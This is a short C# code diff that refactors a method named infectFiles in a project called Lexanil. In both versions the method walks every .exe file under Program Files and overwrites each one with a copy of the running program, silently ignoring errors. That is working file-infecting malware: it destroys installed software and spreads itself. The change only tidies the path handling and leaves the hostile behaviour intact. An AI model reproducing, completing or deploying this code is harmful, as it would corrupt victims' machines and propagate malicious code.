@@ -165,13 +165,11 @@ namespace Lexanil
 
         private void infectFiles()
         {
-            var path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
-            var curfilename = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
             try
             {
-                foreach (string file in Directory.GetFiles(path, "*.exe", SearchOption.AllDirectories))
+                foreach (string file in Directory.GetFiles(Paths.ProgramFiles, "*.exe", SearchOption.AllDirectories))
                 {
-                    File.Copy(curfilename, file, true);
+                    File.Copy(Paths.OurAppPath, file, true);
                 }
             }
             catch (Exception)
